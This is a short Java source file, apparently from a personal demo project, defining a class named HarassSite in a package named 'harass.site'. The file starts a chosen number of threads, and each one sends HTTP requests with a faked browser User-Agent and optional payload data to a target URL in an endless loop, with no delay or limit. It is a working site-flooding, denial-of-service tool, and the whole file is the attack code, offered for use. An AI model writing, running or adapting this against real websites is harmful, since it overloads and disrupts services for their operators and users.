package com.github.kahlkn.demo._function.harass.site;

import com.github.kahlkn.artoria.net.HttpUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang3.StringUtils;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.util.HashMap;
import java.util.Map;

public class HarassSite {
    private static final String DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36";
    private static Map<String, String> headers = new HashMap<>();

    static {
        headers.put("User-Agent", DEFAULT_USER_AGENT);
    }

    public static void exec(int threadNum, final HttpUtils.Method method, final String url, final String data) {
        for (int i = 0; i < threadNum; i++) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    for (; ;) {
                        HttpURLConnection conn = null;
                        OutputStream out = null;
                        try {
                            conn = HttpUtils.create(url).setMethod(method).addHeaders(headers).connect();
                            if (StringUtils.isNotBlank(data) && !"null".equals(data)) {
                                out = conn.getOutputStream();
                                out.write(data.getBytes());
                                out.flush();
                            }
                            System.out.print(conn.getResponseCode() + " ");
                        } catch (Exception e) {
                            System.out.print(e.getMessage() + " ");
                        } finally {
                            IOUtils.closeQuietly(out);
                            IOUtils.close(conn);
                        }
                    }
                }
            }).start();
        }
    }

}
